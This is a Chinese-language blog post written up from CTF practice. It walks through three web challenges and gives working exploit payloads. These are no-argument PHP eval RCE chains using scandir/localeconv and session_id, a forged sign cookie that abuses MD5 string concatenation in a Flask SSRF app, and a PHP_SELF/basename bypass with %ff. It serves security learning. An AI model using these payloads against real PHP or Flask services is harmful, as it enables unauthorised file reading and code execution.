<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="[GXYCTF2019]禁止套娃 1">
<meta property="og:type" content="article">
<meta property="og:title" content="刷题记录2">
<meta property="og:url" content="http://example.com/2023/07/24/buu-1/index.html">
<meta property="og:site_name" content="057lwq&#39;s Blog">
<meta property="og:description" content="[GXYCTF2019]禁止套娃 1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/buu/5-1.png">
<meta property="og:image" content="http://example.com/images/buu/5-2.png">
<meta property="og:image" content="http://example.com/images/buu/5-3.png">
<meta property="og:image" content="http://example.com/images/buu/6-4.png">
<meta property="og:image" content="http://example.com/images/buu/6-5.png">
<meta property="og:image" content="http://example.com/images/buu/6-3.png">
<meta property="og:image" content="http://example.com/images/buu/6-2.png">
<meta property="og:image" content="http://example.com/images/buu/6-1.png">
<meta property="article:published_time" content="2023-07-24T05:13:08.000Z">
<meta property="article:modified_time" content="2023-09-10T02:30:00.193Z">
<meta property="article:author" content="lwq">
<meta property="article:tag" content="buu">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/buu/5-1.png">

<link rel="canonical" href="http://example.com/2023/07/24/buu-1/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>刷题记录2 | 057lwq's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">057lwq's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/24/buu-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lwq">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="057lwq's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          刷题记录2
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-07-24 13:13:08" itemprop="dateCreated datePublished" datetime="2023-07-24T13:13:08+08:00">2023-07-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-09-10 10:30:00" itemprop="dateModified" datetime="2023-09-10T10:30:00+08:00">2023-09-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="GXYCTF2019-禁止套娃-1"><a href="#GXYCTF2019-禁止套娃-1" class="headerlink" title="[GXYCTF2019]禁止套娃 1"></a>[GXYCTF2019]禁止套娃 1</h1><span id="more"></span>
<p>打开环境只有一串子符，查看源码、抓包以及御剑扫描后台都没东西。<br>尝试使用 GitHack 看看是不是源码泄露<br><img src="/images/buu/5-1.png" alt="1"><br><img src="/images/buu/5-2.png" alt="1"><br>找到了源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>php代码审计<br>首先就看到@eval($_GET[‘exp’]);代码执行，执行到这一步需要经过3重正则校验<br>PHP preg_match()：执行正则表达式匹配<br>PHP preg_replace() 函数<br>php中的&#x3D;&#x3D; 和&#x3D;&#x3D;&#x3D;的用法及区别</p>
<p>第一个if过滤了data&#x2F;filter&#x2F;php&#x2F;phar伪协议，不能以伪协议形式直接读取文件</p>
<p>第二个if使用(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了[a-z,<em>]+([a-z,</em>]+((?R)?)),可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子,</p>
<p>第三个if使用正则匹配过滤了et&#x2F;na&#x2F;info等关键字，导致get()、phpinfo()等函数不能使用</p>
<p>payload构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));			  //构造payload读取当前目录下的文件</span><br><span class="line">?exp=print_r(array_reverse(scandir(current(localeconv()))));	  //array_reverse()函数以相反的元素顺序返回数组。</span><br><span class="line">?exp=print_r(next(array_reverse(scandir(current(localeconv())))));//next()函数讲内部指针指向数组中的下一个元素，并输出</span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));//highlight_file将代码高亮显示出来</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">current() 函数返回数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。</span><br></pre></td></tr></table></figure>
<p>loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件,array_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。</p>
<p>方法2<br>上面 的正则过滤中 其实并没有过滤掉 session_id()<br>所以我们可以使用 session_id来获取 flag<br>session_id() 可以用来获取&#x2F;设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload<br><code>?exp=readfile(session_id(session_start()));</code><br>session_id(session_start())<br>即使用session_id获得了PHPSESSID的值flag.php，再使用readfile函数进行文件读取，在此之前需要开启session，即使用session_start().<br><img src="/images/buu/5-3.png" alt="1"></p>
<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># #encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"> </span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):		#是一个简单的赋值函数</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):		#如果没有该文件夹，则创立一个文件夹</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)   #注意w，可以对result.txt文件进行修改</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)	#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)	#打开方式为只读</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()	#读取result.txt中的数据</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])		#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))		#cookie传递action参数，对应不同的处理方式</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))		#传递get方式的参数param</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))			#cookie传递sign参数sign</span><br><span class="line">    ip = request.remote_addr				#获取请求端的ip地址</span><br><span class="line">    if(waf(param)):			#调用waf函数进行过滤</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip) 			#创建Task类对象</span><br><span class="line">    return json.dumps(task.Exec())			#以json的形式返回到客户端</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"> </span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]		#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"> </span><br><span class="line">def getSign(action, param):				#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line">def md5(content):			#将传入的字符串进行md5加密</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line">def waf(param):						#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=9999)</span><br></pre></td></tr></table></figure>
<p>详细过程可看<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115412359">大佬博客</a></p>
<h2 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h2><p>secert_key+’flag.txt’的长度为24（长度就是固定的那部分），已知数据data为scan，额外添加数据为read<br><img src="/images/buu/6-4.png" alt="1"><br><img src="/images/buu/6-5.png" alt="1"></p>
<h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>试着访问了一下 &#x2F;geneSign?param&#x3D;flag.txt ，给出了一个 md5 5a3968ca81e32b175484da4fdf3060fc ，但是只有 scan 的功能，想加入 read 功能就要另想办法了<br><img src="/images/buu/6-3.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure>
<p>看了一下逻辑，在 getSign 处很有意思，这个字符串拼接的就很有意思了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>不妨假设 secert_key 是 xxx ，那么在开始访问<code> /geneSign?param=flag.txt</code> 的时候，返回的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;) </code>，在 python 里面上述表达式就相当于<code>md5(xxxflag.txtscan)</code>，这就很有意思了。</p>
<p>直接构造访问 <code>/geneSign?param=flag.txtread </code>，拿到的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;)</code> ，等价于 <code>md5(&#39;xxxflag.txtreadscan&#39;)</code> ，这就达到了目标。<br><img src="/images/buu/6-2.png" alt="1"><br>直接访问 &#x2F;De1ta?param&#x3D;flag.txt 构造 cookie action&#x3D;readscan;sign&#x3D;7cde191de87fe3ddac26e19acae1525e 即可<br><img src="/images/buu/6-1.png" alt="1"></p>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="SERVER-‘PHP-SELF’"><a href="#SERVER-‘PHP-SELF’" class="headerlink" title="$_SERVER[‘PHP_SELF’]"></a>$_SERVER[‘PHP_SELF’]</h3><p>表示当前的php文件相对于网站根目录的位置地址</p>
<h3 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h3><p>会返回路径重的文件名部分。比如&#x2F;index.php&#x2F;config.php使用basename()之后返回config.php。<br>basename()会去掉文件名开头的非ASCII值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php</span><br><span class="line">var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</span><br></pre></td></tr></table></figure>

<h3 id="不可显字符绕过正则"><a href="#不可显字符绕过正则" class="headerlink" title="不可显字符绕过正则"></a>不可显字符绕过正则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    echo &quot;可以通过不可显字符绕过&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">if (preg_match(&#x27;/config\.php\//i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    echo &quot;专门过滤config/&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>上面两个正则匹配是不一样的，第一个是匹配尾部，第二个是匹配config&#x2F;字符串。<br>匹配尾部的可以通过不可显字符绕过，比如%ff</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>打开环境，进行代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php  </span><br><span class="line">  </span><br><span class="line">// 检查当前 PHP 脚本是否是 &#x27;config.php&#x27;，如果是则退出，不执行任何操作  </span><br><span class="line">// 这是为了防止直接访问 config.php 文件  </span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;  </span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">// 检查 GET 请求中是否存在 &#x27;source&#x27; 参数，如果存在则调用 highlight_file() 函数高亮显示当前 PHP 脚本文件名，并退出  </span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;  </span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));  </span><br><span class="line">  exit();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">// 使用 random_bytes() 生成 64 个随机字节，然后通过 bin2hex() 转换为十六进制字符串  </span><br><span class="line">// 这个字符串被存储在 $secret 变量中  </span><br><span class="line">$secret = bin2hex(random_bytes(64));  </span><br><span class="line">  </span><br><span class="line">// 检查 POST 请求中是否存在 &#x27;guess&#x27; 参数，如果存在则存储在 $guess 变量中  </span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;  </span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];  </span><br><span class="line">    </span><br><span class="line">  // 使用 hash_equals() 函数比较用户猜测的字符串和之前生成的随机字符串是否相等  </span><br><span class="line">  // 如果相等，将 FLAG 的值存储在 $message 变量中，并显示祝贺信息；否则显示 &#x27;Wrong.&#x27;  </span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;  </span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;  </span><br><span class="line">  &#125; else &#123;  </span><br><span class="line">    $message = &#x27;Wrong.&#x27;;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;!doctype html&gt;  </span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;  </span><br><span class="line">  &lt;head&gt;  </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;  </span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;  </span><br><span class="line">  &lt;/head&gt;  </span><br><span class="line">  &lt;body&gt;  </span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;  </span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;  </span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;  </span><br><span class="line">    &lt;hr&gt;  </span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;  </span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;  </span><br><span class="line">&lt;?php &#125; ?&gt;  </span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;  </span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;  </span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;  </span><br><span class="line">    &lt;/form&gt;  </span><br><span class="line">  &lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>思路：根据提示，我们知道flag在config.php中，可以通过highlight_file(basename($_SERVER[‘PHP_SELF’]));来显示config.php；下面的代码这里有点迷惑性，$message &#x3D; ‘Congratulations! The flag is: ‘ . FLAG;，但是在这之前要满足随机数什么的，难度有点大，所以不选择这个方法。</p>
<p>payload:<br><code>index.php/config.php/%ff?source</code><br>既满足preg_match，也满足basename($_SERVER[‘PHP_SELF’])回显是config.php，同时后端的%ff?source也满足isset的需要</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/buu/" rel="tag"># buu</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
